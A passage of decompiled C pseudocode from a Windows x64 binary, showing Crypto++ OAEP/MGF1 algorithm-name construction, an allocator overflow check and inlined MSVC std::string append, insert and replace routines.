  __int64 v20; // rdx
  __int64 v21; // rcx
  __int64 v22; // rdx
  __int64 v23; // rcx
  __int64 v24; // rdx
  __int64 v25; // rcx
  __m128i v27; // [rsp+30h] [rbp-39h] BYREF
  __m128i v28; // [rsp+40h] [rbp-29h]
  __m128i v29; // [rsp+50h] [rbp-19h] BYREF
  __m128i v30; // [rsp+60h] [rbp-9h]
  __m128i v31; // [rsp+70h] [rbp+7h] BYREF
  __m128i v32; // [rsp+80h] [rbp+17h]
  __m128i v33; // [rsp+90h] [rbp+27h] BYREF
  __m128i si128; // [rsp+A0h] [rbp+37h]
  __int64 v35; // [rsp+B0h] [rbp+47h]
  __int64 v36; // [rsp+B8h] [rbp+4Fh]

  v35 = -2i64;
  v36 = a1;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v33.m128i_i8[0] = 0;
  sub_13F106C50(&v33, (const __m128i *)"OAEP-", 5ui64);
  v2 = si128;
  if ( si128.m128i_i64[1] - si128.m128i_i64[0] < 4ui64 )
  {
    v5 = sub_13F107AD0(&v33, 4ui64, 0i64, (const __m128i *)"MGF1", 4ui64);
  }
  else
  {
    si128.m128i_i64[0] += 4i64;
    v3 = &v33;
    if ( v2.m128i_i64[1] >= 0x10ui64 )
      v3 = (__m128i *)v33.m128i_i64[0];
    v4 = (__m128i *)((char *)v3 + v2.m128i_i64[0]);
    sub_13F15EB00(v4, (const __m128i *)"MGF1", 4ui64);
    v4->m128i_i8[4] = 0;
    v5 = &v33;
  }
  v32 = 0i64;
  v31 = *v5;
  v32 = v5[1];
  v5[1].m128i_i64[0] = 0i64;
  v5[1].m128i_i64[1] = 15i64;
  v5->m128i_i8[0] = 0;
  v6 = v32;
  if ( v32.m128i_i64[1] == v32.m128i_i64[0] )
  {
    v9 = sub_13F107AD0(&v31, 1ui64, 0i64, (const __m128i *)"(", 1ui64);
  }
  else
  {
    ++v32.m128i_i64[0];
    v7 = &v31;
    if ( v6.m128i_i64[1] >= 0x10ui64 )
      v7 = (__m128i *)v31.m128i_i64[0];
    v8 = (__m128i *)((char *)v7 + v6.m128i_i64[0]);
    sub_13F15EB00(v8, (const __m128i *)"(", 1ui64);
    v8->m128i_i8[1] = 0;
    v9 = &v31;
  }
  v30 = 0i64;
  v29 = *v9;
  v30 = v9[1];
  v9[1].m128i_i64[0] = 0i64;
  v9[1].m128i_i64[1] = 15i64;
  v9->m128i_i8[0] = 0;
  v10 = v30;
  if ( v30.m128i_i64[1] - v30.m128i_i64[0] < 5ui64 )
  {
    v13 = sub_13F107AD0(&v29, 5ui64, 0i64, (const __m128i *)"SHA-1", 5ui64);
  }
  else
  {
    v30.m128i_i64[0] += 5i64;
    v11 = &v29;
    if ( v10.m128i_i64[1] >= 0x10ui64 )
      v11 = (__m128i *)v29.m128i_i64[0];
    v12 = (__m128i *)((char *)v11 + v10.m128i_i64[0]);
    sub_13F15EB00(v12, (const __m128i *)"SHA-1", 5ui64);
    v12->m128i_i8[5] = 0;
    v13 = &v29;
  }
  v28 = 0i64;
  v27 = *v13;
  v28 = v13[1];
  v13[1].m128i_i64[0] = 0i64;
  v13[1].m128i_i64[1] = 15i64;
  v13->m128i_i8[0] = 0;
  v14 = v28;
  if ( v28.m128i_i64[1] == v28.m128i_i64[0] )
  {
    v17 = sub_13F107AD0(&v27, 1ui64, 0i64, (const __m128i *)")", 1ui64);
  }
  else
  {
    ++v28.m128i_i64[0];
    v15 = &v27;
    if ( v14.m128i_i64[1] >= 0x10ui64 )
      v15 = (__m128i *)v27.m128i_i64[0];
    v16 = (__m128i *)((char *)v15 + v14.m128i_i64[0]);
    sub_13F15EB00(v16, (const __m128i *)")", 1ui64);
    v16->m128i_i8[1] = 0;
    v17 = &v27;
  }
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(__m128i *)a1 = *v17;
  *(__m128i *)(a1 + 16) = v17[1];
  v17[1].m128i_i64[0] = 0i64;
  v17[1].m128i_i64[1] = 15i64;
  v17->m128i_i8[0] = 0;
  if ( v28.m128i_i64[1] >= 0x10ui64 )
  {
    v18 = v28.m128i_i64[1] + 1;
    v19 = v27.m128i_i64[0];
    if ( (unsigned __int64)(v28.m128i_i64[1] + 1) >= 0x1000 )
    {
      v18 = v28.m128i_i64[1] + 40;
      v19 = *(_QWORD *)(v27.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v27.m128i_i64[0] - v19 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v19, v18);
  }
  v28 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v27.m128i_i8[0] = 0;
  if ( v30.m128i_i64[1] >= 0x10ui64 )
  {
    v20 = v30.m128i_i64[1] + 1;
    v21 = v29.m128i_i64[0];
    if ( (unsigned __int64)(v30.m128i_i64[1] + 1) >= 0x1000 )
    {
      v20 = v30.m128i_i64[1] + 40;
      v21 = *(_QWORD *)(v29.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v29.m128i_i64[0] - v21 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v21, v20);
  }
  v30 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v29.m128i_i8[0] = 0;
  if ( v32.m128i_i64[1] >= 0x10ui64 )
  {
    v22 = v32.m128i_i64[1] + 1;
    v23 = v31.m128i_i64[0];
    if ( (unsigned __int64)(v32.m128i_i64[1] + 1) >= 0x1000 )
    {
      v22 = v32.m128i_i64[1] + 40;
      v23 = *(_QWORD *)(v31.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v31.m128i_i64[0] - v23 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v23, v22);
  }
  v32 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v31.m128i_i8[0] = 0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v24 = si128.m128i_i64[1] + 1;
    v25 = v33.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v24 = si128.m128i_i64[1] + 40;
      v25 = *(_QWORD *)(v33.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v33.m128i_i64[0] - v25 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v25, v24);
  }
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F1073C0) ----------------------------------------------------
__int64 __fastcall sub_13F1073C0(unsigned __int64 a1)
{
  __int64 result; // rax
  __m128i v2[2]; // [rsp+28h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+50h] [rbp-48h] BYREF

  result = 0x3FFFFFFFFFFFFFFFi64;
  if ( a1 > 0x3FFFFFFFFFFFFFFFi64 )
  {
    sub_13F1053B0(v2, (const __m128i *)"AllocatorBase: requested size would cause integer overflow");
    sub_13F101600((__int64)pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 13F1073C0: using guessed type __m128i var_70[2];

//----- (000000013F107420) ----------------------------------------------------
__m128i *__fastcall sub_13F107420(__m128i *a1, __m128i *a2, const __m128i *a3)
{
  unsigned __int64 v4; // r8
  __m128i *v6; // rax

  v4 = -1i64;
  do
    ++v4;
  while ( a3->m128i_i8[v4] );
  v6 = sub_13F106DB0(a2, a3, v4);
  a1[1].m128i_i64[0] = 0i64;
  a1[1].m128i_i64[1] = 0i64;
  *a1 = *v6;
  a1[1] = v6[1];
  v6[1].m128i_i64[0] = 0i64;
  v6[1].m128i_i64[1] = 15i64;
  v6->m128i_i8[0] = 0;
  return a1;
}

//----- (000000013F107480) ----------------------------------------------------
__m128i *__fastcall sub_13F107480(__m128i *a1, __m128i *a2, __m128i *a3)
{
  unsigned __int64 v3; // r14
  unsigned __int64 v5; // rcx
  __m128i *v6; // rbx
  unsigned __int64 v7; // r8
  __m128i *v8; // rdi
  unsigned __int64 v9; // rdx
  __m128i *v10; // r15
  unsigned __int64 v11; // r12
  __m128i *v12; // rax

  v3 = a2[1].m128i_u64[0];
  v5 = a2[1].m128i_u64[1];
  v6 = a3;
  v7 = a3[1].m128i_u64[0];
  v8 = a2;
  if ( v7 <= v5 - v3 || (v9 = v6[1].m128i_u64[1], v9 - v7 < v3) )
  {
    if ( v6[1].m128i_i64[1] >= 0x10ui64 )
      v6 = (__m128i *)v6->m128i_i64[0];
    v12 = sub_13F106DB0(v8, v6, v7);
    a1[1].m128i_i64[0] = 0i64;
    a1[1].m128i_i64[1] = 0i64;
    *a1 = *v12;
    a1[1] = v12[1];
    v12[1].m128i_i64[0] = 0i64;
    v12[1].m128i_i64[1] = 15i64;
    v12->m128i_i8[0] = 0;
  }
  else
  {
    if ( v5 >= 0x10 )
      v8 = (__m128i *)v8->m128i_i64[0];
    if ( v3 > v9 - v7 )
    {
      v6 = sub_13F107EB0(v6, v3, 0i64, 0i64, v8, v3);
    }
    else
    {
      v10 = v6;
      v6[1].m128i_i64[0] = v7 + v3;
      if ( v9 >= 0x10 )
        v10 = (__m128i *)v6->m128i_i64[0];
      if ( &v8->m128i_i8[v3] <= (__int8 *)v10 || v8 > (__m128i *)&v10->m128i_i8[v7] )
      {
        v11 = v3;
      }
      else if ( v10 > v8 )
      {
        v11 = (char *)v10 - (char *)v8;
      }
      else
      {
        v11 = 0i64;
      }
      sub_13F15EB00((__m128i *)((char *)v10 + v3), v10, v7 + 1);
      sub_13F15EB00(v10, v8, v11);
      sub_13F15EB00((__m128i *)((char *)v10 + v11), (__m128i *)((char *)v8 + v11 + v3), v3 - v11);
    }
    a1[1].m128i_i64[0] = 0i64;
    a1[1].m128i_i64[1] = 0i64;
    *a1 = *v6;
    a1[1] = v6[1];
    v6[1].m128i_i64[0] = 0i64;
    v6[1].m128i_i64[1] = 15i64;
    v6->m128i_i8[0] = 0;
  }
  return a1;
}

//----- (000000013F107600) ----------------------------------------------------
void __fastcall sub_13F107600(void (__fastcall ****a1)(_QWORD, __int64))
{
  void (__fastcall ***v1)(_QWORD, __int64); // rcx

  v1 = *a1;
  if ( v1 )
    (**v1)(v1, 1i64);
}

//----- (000000013F107650) ----------------------------------------------------
__int64 __fastcall sub_13F107650(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  __int64 v8; // rsi
  __int64 v9; // r14
  __int64 v10; // rbx
  void (__fastcall ***v11)(_QWORD, __int64); // rcx
  void (__fastcall ***v12)(_QWORD, __int64); // rcx
  char v14[8]; // [rsp+28h] [rbp-50h] BYREF
  void (__fastcall ***v15)(_QWORD, __int64); // [rsp+30h] [rbp-48h]
  __int64 v16; // [rsp+40h] [rbp-38h]

  v16 = a1;
  v8 = sub_13F12AA90((__int64)v14);
  v9 = sub_13F14059C(88i64);
  v16 = v9;
  sub_13F15EF70(v9, 0, 0x58ui64);
  *(_QWORD *)(v9 + 8) = a2;
  *(_WORD *)(v9 + 16) = a4;
  *(_QWORD *)(v9 + 24) = 0i64;
  *(_QWORD *)v9 = off_13F183740;
  sub_13F105FC0(v9 + 32, a3);
  v16 = v9;
  v10 = *(_QWORD *)(v8 + 8);
  *(_QWORD *)(v8 + 8) = 0i64;
  v11 = *(void (__fastcall ****)(_QWORD, __int64))(v9 + 24);
  if ( v11 )
    (**v11)(v11, 1i64);
  *(_QWORD *)(v9 + 24) = v10;
  v16 = 0i64;
  v12 = *(void (__fastcall ****)(_QWORD, __int64))(v8 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v8 + 8) = v9;
  *(_BYTE *)(v8 + 16) = a4;
  sub_13F12AA30(a1, v8);
  if ( v15 )
    (**v15)(v15, 1i64);
  return a1;
}
// 13F183740: using guessed type __int64 (__fastcall *off_13F183740[4])();
// 13F107650: using guessed type char var_50[8];

//----- (000000013F107780) ----------------------------------------------------
__int64 __fastcall sub_13F107780(__int64 a1, __int64 a2, _DWORD *a3)
{
  unsigned __int8 v6; // bp
  _QWORD *v7; // r14
  __int64 v8; // rbx
  void (__fastcall ***v9)(_QWORD, __int64); // rcx
  void (__fastcall ***v10)(_QWORD, __int64); // rcx

  v6 = *(_BYTE *)(a1 + 16);
  v7 = (_QWORD *)sub_13F14059C(40i64);
  v7[2] = 0i64;
  v7[4] = 0i64;
  v7[1] = a2;
  *((_WORD *)v7 + 8) = v6;
  v7[3] = 0i64;
  *v7 = off_13F183720;
  *((_DWORD *)v7 + 8) = *a3;
  v8 = *(_QWORD *)(a1 + 8);
  *(_QWORD *)(a1 + 8) = 0i64;
  v9 = (void (__fastcall ***)(_QWORD, __int64))v7[3];
  if ( v9 )
    (**v9)(v9, 1i64);
  v7[3] = v8;
  v10 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 8);
  if ( v10 )
    (**v10)(v10, 1i64);
  *(_QWORD *)(a1 + 8) = v7;
  *(_BYTE *)(a1 + 16) = v6;
  return a1;
}
// 13F183720: using guessed type __int64 (__fastcall *off_13F183720[4])();

//----- (000000013F107870) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F107870()
{
  if ( *(int *)(*(_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4i64) < -2147483644 )
    sub_13F14045C(&dword_13F1CA168);
  return 4090416i64;
}
// 13F1078ED: write access to const memory at 13F1CA108 has been detected
// 13F1CA108: using guessed type __int64 qword_13F1CA108;
// 13F1CA168: using guessed type int dword_13F1CA168;

//----- (000000013F107960) ----------------------------------------------------
__int64 __fastcall sub_13F107960(_DWORD *a1, __int64 a2)
{
  __int64 result; // rax

  result = 0i64;
  while ( a2 )
  {
    *a1++ = 0;
    --a2;
  }
  return result;
}

//----- (000000013F107980) ----------------------------------------------------
__m128i *__fastcall sub_13F107980(__m128i *a1, unsigned __int64 a2)
{
  __int64 v2; // r14
  __int64 v3; // rbx
  unsigned __int64 v5; // rbp
  __int64 v6; // r15
  unsigned __int64 v7; // rcx
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rax
  __int64 v10; // rcx
  __int64 v11; // rax
  __m128i *v12; // rdi
  unsigned __int64 v13; // r8
  __int64 v14; // rbx
  unsigned __int64 v15; // rdx

  v2 = a1[1].m128i_i64[0];
  v3 = 0x7FFFFFFFFFFFFFFFi64;
  if ( 0x7FFFFFFFFFFFFFFFi64 - v2 < a2 )
    sub_13F107C60();
  v5 = a1[1].m128i_u64[1];
  v6 = a2 + v2;
  v7 = (a2 + v2) | 0xF;
  if ( v7 <= 0x7FFFFFFFFFFFFFFFi64 )
  {
    v8 = v5 >> 1;
    if ( v5 <= 0x7FFFFFFFFFFFFFFFi64 - (v5 >> 1) )
    {
      v3 = v7;
      if ( v7 < v8 + v5 )
        v3 = v8 + v5;
    }
  }
  v9 = v3 + 1;
  if ( v3 == -1 )
    v9 = -1i64;
  if ( v9 < 0x1000 )
  {
    if ( v9 )
      v12 = (__m128i *)sub_13F14059C(v9);
    else
      v12 = 0i64;
  }
  else
  {
    v10 = v9 + 39;
    if ( v9 + 39 <= v9 )
      v10 = -1i64;
    v11 = sub_13F14059C(v10);
    if ( !v11 )
      goto LABEL_23;
    v12 = (__m128i *)((v11 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
    v12[-1].m128i_i64[1] = v11;
  }
  a1[1].m128i_i64[0] = v6;
  v13 = v2 + 1;
  a1[1].m128i_i64[1] = v3;
  if ( v5 < 0x10 )
  {
    sub_13F15EB00(v12, a1, v13);
    goto LABEL_22;
  }
  v14 = a1->m128i_i64[0];
  sub_13F15EB00(v12, (const __m128i *)a1->m128i_i64[0], v13);
  v15 = v5 + 1;
  if ( v5 + 1 >= 0x1000 )
  {
    v15 = v5 + 40;
    if ( (unsigned __int64)(v14 - *(_QWORD *)(v14 - 8) - 8) <= 0x1F )
    {
      v14 = *(_QWORD *)(v14 - 8);
      goto LABEL_20;
    }
LABEL_23:
    sub_13F1682C0();
  }
LABEL_20:
  sub_13F14088C(v14, v15);
LABEL_22:
  a1->m128i_i64[0] = (__int64)v12;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F107AD0) ----------------------------------------------------
__m128i *__fastcall sub_13F107AD0(__m128i *a1, unsigned __int64 a2, __int64 a3, const __m128i *a4, unsigned __int64 a5)
{
  unsigned __int64 v5; // r14
  __int64 v6; // rdi
  unsigned __int64 v9; // rbp
  __int64 v10; // r15
  unsigned __int64 v11; // rcx
  unsigned __int64 v12; // rdx
  unsigned __int64 v13; // rax
  __int64 v14; // rcx
  __int64 v15; // rax
  __m128i *v16; // rbx
  __int8 *v17; // r15
  __int64 v18; // rdi
  unsigned __int64 v19; // rdx

  v5 = a1[1].m128i_u64[0];
  v6 = 0x7FFFFFFFFFFFFFFFi64;
  if ( 0x7FFFFFFFFFFFFFFFi64 - v5 < a2 )
    sub_13F107C60();
  v9 = a1[1].m128i_u64[1];
  v10 = a2 + v5;
  v11 = (a2 + v5) | 0xF;
  if ( v11 <= 0x7FFFFFFFFFFFFFFFi64 )
  {
    v12 = v9 >> 1;
    if ( v9 <= 0x7FFFFFFFFFFFFFFFi64 - (v9 >> 1) )
    {
      v6 = v11;
      if ( v11 < v12 + v9 )
        v6 = v12 + v9;
    }
  }
  v13 = v6 + 1;
  if ( v6 == -1 )
    v13 = -1i64;
  if ( v13 < 0x1000 )
  {
    if ( v13 )
      v16 = (__m128i *)sub_13F14059C(v13);
    else
      v16 = 0i64;
  }
  else
  {
    v14 = v13 + 39;
    if ( v13 + 39 <= v13 )
      v14 = -1i64;
    v15 = sub_13F14059C(v14);
    if ( !v15 )
      goto LABEL_23;
    v16 = (__m128i *)((v15 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
    v16[-1].m128i_i64[1] = v15;
  }
  a1[1].m128i_i64[0] = v10;
  v17 = &v16->m128i_i8[v5];
  a1[1].m128i_i64[1] = v6;
  if ( v9 < 0x10 )
  {
    sub_13F15EB00(v16, a1, v5);
    sub_13F15EB00((__m128i *)((char *)v16 + v5), a4, a5);
    v17[a5] = 0;
    goto LABEL_22;
  }
  v18 = a1->m128i_i64[0];
  sub_13F15EB00(v16, (const __m128i *)a1->m128i_i64[0], v5);
  sub_13F15EB00((__m128i *)((char *)v16 + v5), a4, a5);
  v19 = v9 + 1;
  v17[a5] = 0;
  if ( v9 + 1 >= 0x1000 )
  {
    v19 = v9 + 40;
    if ( (unsigned __int64)(v18 - *(_QWORD *)(v18 - 8) - 8) <= 0x1F )
    {
      v18 = *(_QWORD *)(v18 - 8);
      goto LABEL_20;
    }
LABEL_23:
    sub_13F1682C0();
  }
LABEL_20:
  sub_13F14088C(v18, v19);
LABEL_22:
  a1->m128i_i64[0] = (__int64)v16;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F107C60) ----------------------------------------------------
void __noreturn sub_13F107C60()
{
  sub_13F10998C((__int64)"string too long");
}

//----- (000000013F107C80) ----------------------------------------------------
__m128i *__fastcall sub_13F107C80(__m128i *a1, unsigned __int64 a2, const __m128i *a3, unsigned __int64 a4)
{
  unsigned __int64 v6; // r8
  __m128i *v7; // rdi
  unsigned __int64 v8; // r9
  __m128i *v9; // r15
  unsigned __int64 v10; // rsi

  v6 = a1[1].m128i_u64[0];
  v7 = a1;
  if ( v6 < a2 )
    sub_13F107D90();
  v8 = a1[1].m128i_u64[1];
  if ( a4 > v8 - v6 )
    return sub_13F107EB0(a1, a4, 0i64, a2, a3, a4);
  a1[1].m128i_i64[0] = v6 + a4;
  if ( v8 >= 0x10 )
    a1 = (__m128i *)a1->m128i_i64[0];
  v9 = (__m128i *)((char *)a1 + a2);
  if ( &a3->m128i_i8[a4] <= &a1->m128i_i8[a2] || a3 > (const __m128i *)&a1->m128i_i8[v6] )
  {
    v10 = a4;
  }
  else if ( v9 > a3 )
  {
    v10 = (char *)v9 - (char *)a3;
  }
  else
  {
    v10 = 0i64;
  }
  sub_13F15EB00((__m128i *)((char *)v9 + a4), v9, v6 - a2 + 1);
  sub_13F15EB00(v9, a3, v10);
  sub_13F15EB00((__m128i *)((char *)v9 + v10), (const __m128i *)((char *)a3 + v10 + a4), a4 - v10);
  return v7;
}

//----- (000000013F107D90) ----------------------------------------------------
void __noreturn sub_13F107D90()
{
  sub_13F1099B0((__int64)"invalid string position");
}

//----- (000000013F107DB0) ----------------------------------------------------
__int64 __fastcall sub_13F107DB0(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  __int64 v8; // r14
  __int64 v9; // rbx
  void (__fastcall ***v10)(_QWORD, __int64); // rcx
  void (__fastcall ***v11)(_QWORD, __int64); // rcx

  v8 = sub_13F14059C(88i64);
  sub_13F15EF70(v8, 0, 0x58ui64);
  *(_QWORD *)(v8 + 8) = a2;
  *(_WORD *)(v8 + 16) = a4;
  *(_QWORD *)(v8 + 24) = 0i64;
  *(_QWORD *)v8 = off_13F183740;
  sub_13F105FC0(v8 + 32, a3);
  v9 = *(_QWORD *)(a1 + 8);
  *(_QWORD *)(a1 + 8) = 0i64;
  v10 = *(void (__fastcall ****)(_QWORD, __int64))(v8 + 24);
  if ( v10 )
    (**v10)(v10, 1i64);
  *(_QWORD *)(v8 + 24) = v9;
  v11 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 8);
  if ( v11 )
    (**v11)(v11, 1i64);
  *(_QWORD *)(a1 + 8) = v8;
  *(_BYTE *)(a1 + 16) = a4;
  return a1;
}
// 13F183740: using guessed type __int64 (__fastcall *off_13F183740[4])();

//----- (000000013F107EB0) ----------------------------------------------------
__m128i *__fastcall sub_13F107EB0(
        __m128i *a1,
        unsigned __int64 a2,
        __int64 a3,
        unsigned __int64 a4,
        const __m128i *a5,
        unsigned __int64 a6)
{
  __int64 v6; // rbx
  __int64 v7; // r14
  unsigned __int64 v10; // rbp
  __int64 v11; // r12
  unsigned __int64 v12; // rcx
  unsigned __int64 v13; // rdx
  unsigned __int64 v14; // rax
  __int64 v15; // rcx
  __int64 v16; // rax
  __m128i *v17; // rdi
  unsigned __int64 v18; // r13
  __int64 v19; // rbx
  unsigned __int64 v20; // rdx

  v6 = 0x7FFFFFFFFFFFFFFFi64;
  v7 = a1[1].m128i_i64[0];
  if ( 0x7FFFFFFFFFFFFFFFi64 - v7 < a2 )
    sub_13F107C60();
  v10 = a1[1].m128i_u64[1];
  v11 = a2 + v7;
  v12 = (a2 + v7) | 0xF;
  if ( v12 <= 0x7FFFFFFFFFFFFFFFi64 )
  {
    v13 = v10 >> 1;
    if ( v10 <= 0x7FFFFFFFFFFFFFFFi64 - (v10 >> 1) )
    {
      v6 = v12;
      if ( v12 < v13 + v10 )
        v6 = v13 + v10;
    }
  }
  v14 = v6 + 1;
  if ( v6 == -1 )
    v14 = -1i64;
  if ( v14 < 0x1000 )
  {
    if ( v14 )
      v17 = (__m128i *)sub_13F14059C(v14);
    else
      v17 = 0i64;
  }
  else
  {
    v15 = v14 + 39;
    if ( v14 + 39 <= v14 )
      v15 = -1i64;
    v16 = sub_13F14059C(v15);
    if ( !v16 )
      goto LABEL_23;
    v17 = (__m128i *)((v16 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
    v17[-1].m128i_i64[1] = v16;
  }
  a1[1].m128i_i64[0] = v11;
  a1[1].m128i_i64[1] = v6;
  v18 = v7 - a4 + 1;
  if ( v10 < 0x10 )
  {
    sub_13F15EB00(v17, a1, a4);
    sub_13F15EB00((__m128i *)((char *)v17 + a4), a5, a6);
    sub_13F15EB00((__m128i *)((char *)v17 + a4 + a6), (__m128i *)((char *)a1 + a4), v18);
    goto LABEL_22;
  }
  v19 = a1->m128i_i64[0];
  sub_13F15EB00(v17, (const __m128i *)a1->m128i_i64[0], a4);
  sub_13F15EB00((__m128i *)((char *)v17 + a4), a5, a6);
  sub_13F15EB00((__m128i *)((char *)v17 + a4 + a6), (const __m128i *)(a4 + v19), v18);
  v20 = v10 + 1;
  if ( v10 + 1 >= 0x1000 )
  {
    v20 = v10 + 40;
    if ( (unsigned __int64)(v19 - *(_QWORD *)(v19 - 8) - 8) <= 0x1F )
    {
      v19 = *(_QWORD *)(v19 - 8);
      goto LABEL_20;
    }
LABEL_23:
    sub_13F1682C0();
  }
LABEL_20:
  sub_13F14088C(v19, v20);
LABEL_22:
  a1->m128i_i64[0] = (__int64)v17;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F108070) ----------------------------------------------------
__m128i *__fastcall sub_13F108070(
        __m128i *a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        const __m128i *a4,
        unsigned __int64 a5)
{
  unsigned __int64 v6; // rcx
  unsigned __int64 v8; // r15
  bool v9; // cf
  unsigned __int64 v10; // r8
  __m128i *v11; // rax
  unsigned __int64 v13; // rbp
  unsigned __int64 v14; // r12
  __m128i *v15; // rax
  __int8 *v16; // rbx
  __m128i *v17; // r9
  __m128i *v18; // r13
  const __m128i *v19; // rdx
  unsigned __int64 v20; // rbx

  v6 = a1[1].m128i_u64[0];
  v8 = a3;
  if ( v6 < a2 )
    sub_13F107D90();
  v9 = v6 - a2 < a3;
  v10 = a1[1].m128i_u64[1];
  if ( v9 )
    v8 = v6 - a2;
  if ( v8 == a5 )
  {
    v11 = a1;
    if ( v10 >= 0x10 )
      v11 = (__m128i *)a1->m128i_i64[0];
    sub_13F15EB00((__m128i *)((char *)v11 + a2), a4, a5);
    return a1;
  }
  else
  {
    v13 = v6 - v8 - a2;
    v14 = a5 - v8;
    if ( a5 >= v8 )
    {
      if ( v14 > v10 - v6 )
      {
        return sub_13F108210(a1, a5 - v8, 0i64, a2, v8, a4, a5);
      }
      else
      {
        a1[1].m128i_i64[0] = v14 + v6;
        v17 = a1;
        if ( v10 >= 0x10 )
          v17 = (__m128i *)a1->m128i_i64[0];
        v18 = (__m128i *)((char *)v17 + a2);
        v19 = (__m128i *)((char *)v17 + a2 + v8);
        if ( &a4->m128i_i8[a5] <= (__int8 *)v18 || a4 > (const __m128i *)&v17->m128i_i8[v6] )
        {
          v20 = a5;
        }
        else if ( v19 > a4 )
        {
          v20 = (char *)v19 - (char *)a4;
        }
        else
        {
          v20 = 0i64;
        }
        sub_13F15EB00((__m128i *)((char *)v19 + v14), v19, v13 + 1);
        sub_13F15EB00(v18, a4, v20);
        sub_13F15EB00((__m128i *)((char *)v18 + v20), (const __m128i *)((char *)a4 + v20 + v14), a5 - v20);
        return a1;
      }
    }
    else
    {
      a1[1].m128i_i64[0] = v14 + v6;
      v15 = a1;
      if ( v10 >= 0x10 )
        v15 = (__m128i *)a1->m128i_i64[0];
      v16 = &v15->m128i_i8[a2];
      sub_13F15EB00((__m128i *)((char *)v15 + a2), a4, a5);
      sub_13F15EB00((__m128i *)&v16[a5], (const __m128i *)&v16[v8], v13 + 1);
      return a1;
    }
  }
}

//----- (000000013F108210) ----------------------------------------------------
__m128i *__fastcall sub_13F108210(
        __m128i *a1,
        unsigned __int64 a2,
        __int64 a3,
        unsigned __int64 a4,
        __int64 a5,
        const __m128i *a6,
        unsigned __int64 a7)
{
  __int64 v7; // rbx
  __int64 v8; // rbp
  __int64 v11; // r12
  unsigned __int64 v12; // r14
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // rax
  __int64 v16; // rcx
  __int64 v17; // rax
  __m128i *v18; // rdi
  __int8 *v19; // r12
  __int64 v20; // rbx
  unsigned __int64 v21; // rdx

  v7 = 0x7FFFFFFFFFFFFFFFi64;
  v8 = a1[1].m128i_i64[0];
  if ( 0x7FFFFFFFFFFFFFFFi64 - v8 < a2 )
    sub_13F107C60();
  v11 = a2 + v8;
  v12 = a1[1].m128i_u64[1];
  v13 = (a2 + v8) | 0xF;
  if ( v13 <= 0x7FFFFFFFFFFFFFFFi64 )
  {
    v14 = v12 >> 1;
    if ( v12 <= 0x7FFFFFFFFFFFFFFFi64 - (v12 >> 1) )
    {
      v7 = v13;
      if ( v13 < v14 + v12 )
        v7 = v14 + v12;
    }
  }
  v15 = v7 + 1;
  if ( v7 == -1 )
    v15 = -1i64;
  if ( v15 < 0x1000 )
  {
    if ( v15 )
      v18 = (__m128i *)sub_13F14059C(v15);
    else
      v18 = 0i64;
  }
  else
  {
    v16 = v15 + 39;
    if ( v15 + 39 <= v15 )
      v16 = -1i64;
    v17 = sub_13F14059C(v16);
    if ( !v17 )
      goto LABEL_23;
    v18 = (__m128i *)((v17 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
    v18[-1].m128i_i64[1] = v17;
  }
  a1[1].m128i_i64[1] = v7;
  a1[1].m128i_i64[0] = v11;
  v19 = &v18->m128i_i8[a4];
  if ( v12 < 0x10 )
  {
    sub_13F15EB00(v18, a1, a4);
    sub_13F15EB00((__m128i *)((char *)v18 + a4), a6, a7);
    sub_13F15EB00((__m128i *)&v19[a7], (__m128i *)((char *)a1 + a4 + a5), v8 - a4 - a5 + 1);
    goto LABEL_22;
  }
  v20 = a1->m128i_i64[0];
  sub_13F15EB00(v18, (const __m128i *)a1->m128i_i64[0], a4);
  sub_13F15EB00((__m128i *)((char *)v18 + a4), a6, a7);
  sub_13F15EB00((__m128i *)&v19[a7], (const __m128i *)(a5 + a4 + v20), v8 - a4 - a5 + 1);
  v21 = v12 + 1;
  if ( v12 + 1 >= 0x1000 )
  {
    v21 = v12 + 40;
    if ( (unsigned __int64)(v20 - *(_QWORD *)(v20 - 8) - 8) <= 0x1F )
    {
      v20 = *(_QWORD *)(v20 - 8);
      goto LABEL_20;
    }
LABEL_23:
